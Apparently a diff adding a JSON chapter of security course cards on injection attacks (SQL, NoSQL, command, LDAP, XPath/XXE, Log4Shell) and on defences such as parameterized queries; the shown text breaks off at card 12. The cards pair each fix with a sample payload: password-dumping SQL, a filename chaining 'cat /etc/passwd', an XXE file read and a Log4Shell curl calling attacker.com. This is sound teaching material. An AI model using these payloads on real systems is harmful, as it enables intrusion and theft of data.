@@ -1,0 +1,1276 @@
+{
+  "chapterId": "sec-ch03-injection-attacks",
+  "shardIndex": 3,
+  "cards": [
+    {
+      "id": "sec-ch03-c001",
+      "order": 1,
+      "title": "The Injection Root Cause",
+      "teaser": "Every injection attack — SQL, command, LDAP, XPath, log — shares one root cause: the application mixes untrusted data with trusted instructions in a single channel, and the interpreter cannot tell them apart. Fix the channel; fix the class.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Injection is not a bug in a library or an OS. It is an architectural mistake: the program treats a string supplied by an attacker as part of the program itself. The attacker does not need to write malware or bypass a firewall — they just need to supply input the developer did not anticipate, and the interpreter will execute it."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The pattern appears in every interpreted context:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "style": "bulleted",
+          "items": [
+            [
+              {
+                "text": "SQL interpreter",
+                "marks": ["bold"]
+              },
+              {
+                "text": " — user input becomes part of a query string; the database engine executes attacker-controlled SQL."
+              }
+            ],
+            [
+              {
+                "text": "OS shell",
+                "marks": ["bold"]
+              },
+              {
+                "text": " — user input is passed to a shell command; the OS executes attacker-controlled commands."
+              }
+            ],
+            [
+              {
+                "text": "LDAP directory",
+                "marks": ["bold"]
+              },
+              {
+                "text": " — user input is embedded in an LDAP filter string; the directory server executes attacker-controlled queries."
+              }
+            ],
+            [
+              {
+                "text": "Log output",
+                "marks": ["bold"]
+              },
+              {
+                "text": " — user input is written verbatim to a log; log processors interpret attacker-controlled log entries."
+              }
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The universal anti-pattern is "
+            },
+            {
+              "text": "string concatenation as query construction",
+              "marks": ["bold"]
+            },
+            {
+              "text": ". The moment a developer writes code like "
+            },
+            {
+              "text": "query = \"SELECT * FROM users WHERE id = \" + userId",
+              "marks": ["code"]
+            },
+            {
+              "text": ", they have handed an attacker the power to rewrite that query. The fix is always some form of structural separation: keep data as data, keep instructions as instructions, never let them merge in a single string."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "OWASP has ranked Injection as the #1 or #3 web application risk every year since 2007. It is not a novel or esoteric vulnerability — it is the oldest and most exploited class in existence, and it persists because string concatenation is the path of least resistance."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Injection happens when an attacker's data is treated as instructions. The fix in every case is the same: never merge untrusted data and instructions in the same string — keep data in data structures and instructions in code."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c002",
+      "order": 2,
+      "title": "Classic SQL Injection — UNION and Error-Based Exfiltration",
+      "teaser": "UNION-based SQL injection appends attacker-chosen SELECT statements to a legitimate query, smuggling arbitrary database contents into the application response. Error-based injection uses the database error message itself as the data exfiltration channel.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "When a web application builds a query by concatenating user input, an attacker can terminate the intended query and append their own. Consider a product lookup endpoint:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Vulnerable code (Python):"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# VULNERABLE — do not ship\nquery = \"SELECT name, price FROM products WHERE id = \" + request.args[\"id\"]"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "If the attacker supplies "
+            },
+            {
+              "text": "id=1 UNION SELECT username, password FROM users--",
+              "marks": ["code"]
+            },
+            {
+              "text": " the database executes:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "SELECT name, price FROM products WHERE id = 1\nUNION\nSELECT username, password FROM users--"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The application returns the username and password columns in the same response fields it used for product names and prices. The double-dash comment marker silences any trailing SQL the developer appended. The attacker now has the full users table."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Error-based injection works differently: instead of appending a UNION, the attacker crafts input that triggers a database error whose message "
+            },
+            {
+              "text": "contains",
+              "marks": ["italic"]
+            },
+            {
+              "text": " sensitive data. For example, in MySQL:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "-- Attacker input causes the DB to embed schema info in the error message\nSELECT extractvalue(1, concat(0x7e, (SELECT version())))"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The database returns an error like: "
+            },
+            {
+              "text": "XPATH syntax error: '~8.0.33-MySQL Community Server'",
+              "marks": ["code"]
+            },
+            {
+              "text": ". The attacker reads the version (or any other value) from the error message. This works whenever the application surfaces raw database errors to the user."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "info",
+          "runs": [
+            {
+              "text": "The TalkTalk breach (October 2015) was executed by teenagers using textbook UNION-based SQL injection against an unpatched database. It exposed 156,959 customer records and cost TalkTalk approximately £77 million in remediation and lost customers. The vulnerability had been known for over a decade."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "UNION injection appends a second SELECT to your query so the attacker gets extra rows back. Error-based injection tricks the database into putting sensitive data inside its own error message. Both work because input became part of the SQL."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c003",
+      "order": 3,
+      "title": "Blind SQL Injection — Boolean-Based and Time-Based",
+      "teaser": "When the application suppresses errors and returns no query output, classic exfiltration is impossible. Blind injection asks yes/no questions (boolean-based) or measures response delays (time-based) to extract data one bit at a time.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Many modern applications hide database errors and return generic responses. An attacker receives only \"User found\" or \"User not found\" — no data, no errors. UNION and error-based techniques fail. Blind injection fills the gap."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Boolean-based blind injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " appends a condition to the query and observes whether the application's response changes:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "-- Is the first character of the admin password 'a'?\n-- (inject into ?id= parameter)\n1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n-- Response differs when TRUE vs FALSE, leaking one character per request"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "By binary-searching the character space, an attacker can extract the full password in about 7 requests per character (log2(95) ≈ 6.6 for printable ASCII). A 12-character password costs around 84 HTTP requests. Automated tools like sqlmap do this in seconds."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Time-based blind injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " is used when even the response body is identical for true and false outcomes. The attacker injects a conditional delay:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "-- MySQL: if first char of admin password is 'a', sleep 5 seconds\n1 AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--\n\n-- PostgreSQL equivalent\n1; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin'--"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "A 5-second response means the condition is true; an immediate response means false. The attacker measures wall-clock time, not response content. This technique works even against APIs that return only HTTP status codes."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "info",
+          "runs": [
+            {
+              "text": "Blind injection is slower than UNION-based, but no less complete. Given enough requests, an attacker extracts any value the query user can read. Tools like sqlmap automate both techniques and can dump an entire database schema and content overnight."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "If you hide the query output, attackers ask yes/no questions instead. Boolean blind checks whether the page changes; time-based blind checks whether the server pauses. Either way, they reconstruct the data bit by bit."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c004",
+      "order": 4,
+      "title": "Second-Order SQL Injection",
+      "teaser": "Second-order injection stores a malicious payload in the database during one request, then triggers it during a later operation — bypassing input sanitization at ingestion time because the payload sits in trusted storage when it is used.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "First-order injection fires in the same request as the payload delivery. Second-order injection is a two-phase attack:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "style": "bulleted",
+          "items": [
+            [
+              {
+                "text": "Phase 1 — Store:",
+                "marks": ["bold"]
+              },
+              {
+                "text": " The attacker registers a username like "
+              },
+              {
+                "text": "admin'--",
+                "marks": ["code"]
+              },
+              {
+                "text": ". The application's input sanitizer escapes the apostrophe on the way in, so the literal string "
+              },
+              {
+                "text": "admin'--",
+                "marks": ["code"]
+              },
+              {
+                "text": " is stored safely in the database."
+              }
+            ],
+            [
+              {
+                "text": "Phase 2 — Trigger:",
+                "marks": ["bold"]
+              },
+              {
+                "text": " Later, the application reads the username back from the database — where it now \"trusts\" it — and uses it in a new query without sanitization. The unescaped payload executes."
+              }
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "A classic scenario: a password-change function that reads the username from the session (originally retrieved from DB) and embeds it directly:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# VULNERABLE — second-order injection\n# session['username'] was read from DB; developer trusts it\nquery = \"UPDATE users SET password='\" + new_password + \"' WHERE username='\" + session['username'] + \"'\"\n\n# If session['username'] = \"admin'--\" the executed query becomes:\n# UPDATE users SET password='hunter2' WHERE username='admin'--'\n# Which updates the admin account, not the attacker's account"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Second-order injection defeats the common (but insufficient) defense of \"sanitize on input.\" It reveals why the only correct fix is parameterized queries at every query-construction site, regardless of where the data came from. Trusted sources include the database itself."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "The mistake that enables second-order injection is the belief that data already in the database is safe. It is not. Parameterize every query. Trust level is irrelevant — the SQL interpreter has no notion of provenance."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Second-order injection stores the attack payload first and fires it later, when the app reads it back from the database and uses it in a new query. It bypasses \"sanitize on input\" rules because by the time the attack lands, the data looks like it came from a trusted source."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c005",
+      "order": 5,
+      "title": "NoSQL Injection — MongoDB Operator Injection and Redis Injection",
+      "teaser": "NoSQL databases are not immune to injection. MongoDB's query operators let attackers bypass authentication with JSON payloads; Redis EVAL and command pipelining create code-execution paths when user input reaches the command layer.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The SQL injection mental model — string concatenation producing malformed SQL — leads developers to assume NoSQL databases are safe. They are not. The injection surface shifts; the root cause does not."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "MongoDB operator injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " exploits the fact that MongoDB queries use JSON objects with special operator keys. A login endpoint that passes a parsed JSON body directly to a query is vulnerable:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "javascript",
+          "text": "// VULNERABLE Node.js / Express\napp.post('/login', (req, res) => {\n  // req.body is { username: ..., password: ... } — attacker controls values\n  User.findOne({ username: req.body.username, password: req.body.password })\n});\n\n// Attack: send JSON body\n// { \"username\": \"admin\", \"password\": { \"$ne\": null } }\n// MongoDB evaluates: find user where username='admin' AND password != null\n// Returns the admin user without knowing the password"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The "
+            },
+            {
+              "text": "$ne",
+              "marks": ["code"]
+            },
+            {
+              "text": ", "
+            },
+            {
+              "text": "$gt",
+              "marks": ["code"]
+            },
+            {
+              "text": ", "
+            },
+            {
+              "text": "$regex",
+              "marks": ["code"]
+            },
+            {
+              "text": ", and "
+            },
+            {
+              "text": "$where",
+              "marks": ["code"]
+            },
+            {
+              "text": " operators are the primary weapons. "
+            },
+            {
+              "text": "$where",
+              "marks": ["code"]
+            },
+            {
+              "text": " is particularly dangerous as it executes arbitrary JavaScript server-side in older MongoDB versions."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Redis injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " typically arises when user input is used to construct Redis commands via a client library that accepts raw command strings, or when "
+            },
+            {
+              "text": "EVAL",
+              "marks": ["code"]
+            },
+            {
+              "text": " is called with unsanitized Lua scripts. An attacker who controls the Lua code passed to EVAL has arbitrary server-side code execution on the Redis host."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "Defenses: validate that query parameters are the expected scalar types (strings, numbers) before passing them to MongoDB. Use allowlisted field names. Never pass user-controlled values to $where or EVAL. Use MongoDB's schema validation to reject operator objects in fields that should hold strings."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "MongoDB injection works by slipping special operator objects (like { \"$ne\": null }) in where the app expects a plain value. The database treats them as query operators, not data, letting attackers bypass authentication or extract arbitrary records without SQL."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c006",
+      "order": 6,
+      "title": "Command Injection — Shell Metacharacters and OS Execution",
+      "teaser": "Command injection occurs when user-supplied input reaches an OS shell command — via system(), exec(), subprocess, or similar — and shell metacharacters allow the attacker to chain additional commands. The risk is full OS-level code execution.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "SQL injection hands the attacker a database. Command injection hands them the operating system. The severity jump is significant: from reading tables to reading files, spawning processes, establishing reverse shells, and pivoting across the network."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The vulnerability appears when an application passes user input to a shell:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "import os\n\n# VULNERABLE — user controls filename\ndef convert_image(filename):\n    os.system(\"convert \" + filename + \" output.png\")\n\n# Attack: filename = \"img.jpg; cat /etc/passwd > /tmp/out.txt\"\n# Shell executes: convert img.jpg; cat /etc/passwd > /tmp/out.txt\n# Semicolon chains commands; attacker reads the password file\n\n# Other metacharacters:\n# & (background), | (pipe), && (AND), || (OR), $(...) (subshell), ` ` (backtick)"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The safe alternative is to use APIs that accept argument lists rather than shell strings, bypassing the shell entirely:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "import subprocess\n\n# SAFE — list form bypasses shell interpretation\ndef convert_image(filename):\n    subprocess.run([\"convert\", filename, \"output.png\"], check=True)\n# No shell is invoked; metacharacters in filename are treated as literal characters"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Real-world examples include web interfaces for network utilities (ping, traceroute, nslookup), image/document converters, and archive tools. Any place a developer reaches for "
+            },
+            {
+              "text": "shell=True",
+              "marks": ["code"]
+            },
+            {
+              "text": " (Python) or "
+            },
+            {
+              "text": "exec()",
+              "marks": ["code"]
+            },
+            {
+              "text": " with a constructed string is a potential command injection site."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "The Shellshock vulnerability (CVE-2014-6271) demonstrated how shell metacharacter handling in Bash's environment variable parsing led to remote code execution across millions of servers. The CGI interface passed HTTP headers directly to shell environment variables, and Bash executed trailing commands."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Command injection means your application accidentally becomes a shell prompt for attackers. When user input reaches a system() or exec() call as a string, shell metacharacters like ; & | let the attacker append their own OS commands."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c007",
+      "order": 7,
+      "title": "LDAP Injection — Directory Query Injection",
+      "teaser": "LDAP injection embeds attacker-controlled special characters into LDAP filter strings, allowing attackers to alter directory queries, bypass authentication, or enumerate directory objects — the same root cause as SQL injection, different query language.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "LDAP (Lightweight Directory Access Protocol) is used for authentication and directory lookups in enterprise environments (Active Directory, OpenLDAP). Applications construct LDAP filter strings to find users or verify credentials."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "A vulnerable login check might construct:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "java",
+          "text": "// VULNERABLE\nString filter = \"(&(uid=\" + username + \")(password=\" + password + \"))\";\n// Normal: (&(uid=alice)(password=secret))\n\n// Attack: username = \"admin)(&)\"\n// Resulting filter: (&(uid=admin)(&))(password=attacker_input))\n// The (&) is always true; the password check is now outside the AND — bypassed\n// Attacker logs in as admin with any password"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "LDAP special characters that must be escaped: "
+            },
+            {
+              "text": "( ) * \\ / NUL",
+              "marks": ["code"]
+            },
+            {
+              "text": ". The "
+            },
+            {
+              "text": "*",
+              "marks": ["code"]
+            },
+            {
+              "text": " wildcard is particularly dangerous — supplying "
+            },
+            {
+              "text": "*",
+              "marks": ["code"]
+            },
+            {
+              "text": " as a password in some LDAP implementations matches any value, granting access without a valid credential."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Defenses follow the same pattern as SQL:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "style": "bulleted",
+          "items": [
+            [
+              {
+                "text": "Use LDAP libraries that support parameterized search filters",
+                "marks": ["bold"]
+              },
+              {
+                "text": " (e.g., RFC 4515-compliant escaping functions)."
+              }
+            ],
+            [
+              {
+                "text": "Escape all special characters",
+                "marks": ["bold"]
+              },
+              {
+                "text": " in user-supplied values before embedding in filter strings: "
+              },
+              {
+                "text": "( → \\28, ) → \\29, * → \\2a, \\ → \\5c",
+                "marks": ["code"]
+              },
+              {
+                "text": "."
+              }
+            ],
+            [
+              {
+                "text": "Validate input format",
+                "marks": ["bold"]
+              },
+              {
+                "text": " — usernames are typically alphanumeric; reject anything containing LDAP metacharacters before the query is constructed."
+              }
+            ]
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "LDAP injection is SQL injection for directory servers. Parentheses and asterisks are the metacharacters; the attack inserts them to break out of the intended filter and rewrite the directory query. Escape user input or use a parameterized API."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c008",
+      "order": 8,
+      "title": "XPath and XML Injection",
+      "teaser": "XPath injection corrupts XML document queries the same way SQL injection corrupts database queries. XML injection manipulates the document structure itself. Both arise when user input is embedded directly into XML processing pipelines.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "XPath injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " targets applications that authenticate or query by constructing XPath expressions against XML data stores. A login system might query:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# VULNERABLE XPath authentication\nxpath_query = \"//users/user[name='\" + username + \"' and password='\" + password + \"']\"\n\n# Attack: username = \"admin' or '1'='1\"\n# Query becomes: //users/user[name='admin' or '1'='1' and password='x']\n# '1'='1' is always true; bypasses authentication\n\n# Attacker with ' or '1'='1 in both fields:\n# //users/user[name='' or '1'='1' and password='' or '1'='1']\n# Returns ALL users"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "XML injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " occurs when user input is inserted directly into XML being constructed or parsed. Attackers can inject new XML elements, alter structure, or exploit XXE (XML eXternal Entity) to read local files:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "xml",
+          "text": "<!-- XXE attack via external entity declaration -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n<!-- If the XML parser resolves external entities, the server reads /etc/passwd\n     and includes it in the parsed document returned to the attacker -->"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Defenses: use parameterized XPath APIs where available. Disable external entity resolution in XML parsers (set "
+            },
+            {
+              "text": "FEATURE_SECURE_PROCESSING",
+              "marks": ["code"]
+            },
+            {
+              "text": " in Java; set "
+            },
+            {
+              "text": "resolve_entities=False",
+              "marks": ["code"]
+            },
+            {
+              "text": " in Python's lxml). Allowlist-validate all input before embedding it in XPath expressions."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "info",
+          "runs": [
+            {
+              "text": "XXE vulnerabilities were implicated in high-profile incidents including a 2014 Facebook vulnerability that allowed reading internal files, and numerous SAML authentication bypass bugs, because SAML assertions are XML documents processed by parsers with entity resolution enabled."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "XPath injection rewrites XML document queries using the same quote-escape trick as SQL injection. XXE injection convinces the XML parser to fetch and embed external files as if they were part of the document. Both need structural separation between data and query."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c009",
+      "order": 9,
+      "title": "Log Injection and Log4Shell",
+      "teaser": "Log injection writes attacker-controlled content into log files, enabling log forging and security audit tampering. Log4Shell (CVE-2021-44228) weaponized log injection to achieve remote code execution via JNDI lookups embedded in log messages.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Log injection",
+              "marks": ["bold"]
+            },
+            {
+              "text": " — at its simplest — means an attacker can write arbitrary content to log files. If an application logs user input verbatim:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# VULNERABLE\nusername = request.args.get('username')\nlogger.info(f\"Login attempt for user: {username}\")\n\n# Attacker supplies: username = \"alice\\nINFO: Login successful for admin\"\n# Log file now contains a forged 'Login successful' entry for admin\n# Security teams reading the log see fabricated evidence"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Newline injection into logs is the classic low-severity form: forge entries, hide attack evidence, confuse incident response."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Log4Shell (CVE-2021-44228)",
+              "marks": ["bold"]
+            },
+            {
+              "text": " demonstrated a catastrophic escalation. Apache Log4j 2.x supported a message lookup syntax: when it logged a string containing "
+            },
+            {
+              "text": "${jndi:ldap://attacker.com/a}",
+              "marks": ["code"]
+            },
+            {
+              "text": ", Log4j resolved the JNDI reference — connecting to the attacker's LDAP server and loading a Java class. The loaded class executed on the server. Any log message that contained attacker-controlled input (HTTP headers, User-Agent, form fields) was a potential RCE vector."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "bash",
+          "text": "# Attack: set User-Agent header to a JNDI lookup\ncurl -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' https://target.com/\n# If the app logs User-Agent (virtually every app does), Log4j processes the lookup,\n# connects to attacker.com, and executes the returned Java class"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Log4Shell was discovered in December 2021 and affected hundreds of millions of systems including those at Apple, Amazon, Cloudflare, Minecraft, and countless enterprise applications. It was rated CVSS 10.0 — maximum severity."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "Defenses: never log user input without sanitization. Strip or encode CRLF characters before logging. For Log4j specifically: upgrade to 2.17.1+ or set log4j2.formatMsgNoLookups=true. Never allow logging frameworks to perform network lookups on logged content."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Log injection writes attacker text into your logs. Log4Shell turned that into code execution: Log4j saw a special ${jndi:...} string in any logged input and automatically fetched and ran code from an attacker's server. Logging user input verbatim is never safe."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c010",
+      "order": 10,
+      "title": "Parameterized Queries and Prepared Statements",
+      "teaser": "Parameterized queries are the primary and most reliable defense against SQL injection. They separate SQL structure from data at the API level — the database receives a query template and data values as distinct objects, making structural injection impossible.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Parameterized queries (also called prepared statements) work by sending the SQL structure to the database engine "
+            },
+            {
+              "text": "before",
+              "marks": ["italic"]
+            },
+            {
+              "text": " the data. The engine parses and plans the query once. Data values are then bound into the pre-parsed plan as typed parameters — they are never processed as SQL syntax."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "import psycopg2\n\nconn = psycopg2.connect(DSN)\ncur = conn.cursor()\n\n# VULNERABLE — string concatenation\nuser_id = request.args['id']\ncur.execute(\"SELECT * FROM users WHERE id = \" + user_id)\n\n# SAFE — parameterized query\nuser_id = request.args['id']\ncur.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n# The %s is a parameter slot; the DB driver sends user_id as data, never as SQL\n# Input '1 OR 1=1' is treated as a literal string, not SQL — returns 0 rows"
+        },
+        {
+          "type": "code",
+          "lang": "java",
+          "text": "// Java JDBC — prepared statement\nString sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\nPreparedStatement ps = conn.prepareStatement(sql);\nps.setString(1, username);  // Parameter 1: data, not SQL\nps.setString(2, password);  // Parameter 2: data, not SQL\nResultSet rs = ps.executeQuery();\n// Even if username = \"admin'--\", the apostrophe is literal, not a SQL delimiter"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Parameterized queries work in every major language and database driver: Python (psycopg2, pymysql), Java (JDBC, JPA), Node.js (pg, mysql2), C# (SqlCommand), PHP (PDO), Ruby (ActiveRecord placeholders). The syntax varies; the protection is universal."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "info",
+          "runs": [
+            {
+              "text": "Parameterized queries also provide a performance benefit: the query plan is compiled once and cached. Repeated execution with different parameters reuses the plan. For high-throughput applications, this is a meaningful optimization alongside the security benefit."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "A parameterized query sends the SQL template to the database first, then sends the data separately. The database never parses user input as SQL — it only treats it as a value to fill a slot. No matter what the attacker types, it cannot become code."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c011",
+      "order": 11,
+      "title": "ORM Safety — When ORMs Protect and When They Do Not",
+      "teaser": "ORMs (Object-Relational Mappers) use parameterized queries internally for standard operations, providing injection safety by default. But raw query escape hatches — raw(), execute(), string-formatted queries — reintroduce the vulnerability the ORM was meant to eliminate.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "An ORM like SQLAlchemy, Django ORM, ActiveRecord, or Hibernate generates parameterized SQL for standard CRUD operations. A developer using the ORM's query API gets injection safety automatically:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# Django ORM — SAFE: generates parameterized SQL\nusers = User.objects.filter(username=request.POST['username'])\n# Django generates: SELECT ... WHERE username = %s with the value bound separately\n\n# SQLAlchemy ORM — SAFE\nresult = session.query(User).filter(User.username == username).all()"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The danger arises when developers bypass the ORM's query builder for performance, flexibility, or legacy reasons:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# Django raw() — VULNERABLE if formatting user input into the string\nusername = request.POST['username']\nusers = User.objects.raw(\"SELECT * FROM auth_user WHERE username = '\" + username + \"'\")\n\n# SQLAlchemy text() — VULNERABLE if concatenating\nfrom sqlalchemy import text\nresult = session.execute(text(\"SELECT * FROM users WHERE id = \" + user_id))\n\n# SAFE version with text() — use named parameters\nresult = session.execute(text(\"SELECT * FROM users WHERE id = :uid\"), {\"uid\": user_id})"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Dynamic ORDER BY clauses are a common edge case. ORM query builders often do not parameterize column names (only values), so developers may concatenate the column name from user input:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "# VULNERABLE — column name injected into ORDER BY\nsort_col = request.args.get('sort', 'created_at')\nUser.objects.raw(f\"SELECT * FROM auth_user ORDER BY {sort_col}\")\n\n# SAFE — allowlist the sort column\nALLOWED_SORT_COLS = {'username', 'email', 'created_at'}\nsort_col = request.args.get('sort', 'created_at')\nif sort_col not in ALLOWED_SORT_COLS:\n    sort_col = 'created_at'\nUser.objects.order_by(sort_col)  # Use ORM method, not raw SQL"
+        },
+        {
+          "type": "callout",
+          "variant": "warning",
+          "runs": [
+            {
+              "text": "Rule of thumb: if you can write it with the ORM's standard API (filter, exclude, order_by, annotate), do so. Reach for raw() or text() only when necessary, and when you do, always use named parameters — never string concatenation."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "ORMs protect you by default because they generate parameterized queries internally. The escape hatch methods like raw() or execute() bypass that protection — if you use them with string concatenation, you are back to writing vulnerable SQL by hand."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c012",
+      "order": 12,
+      "title": "Input Validation — Allowlists vs Denylists",
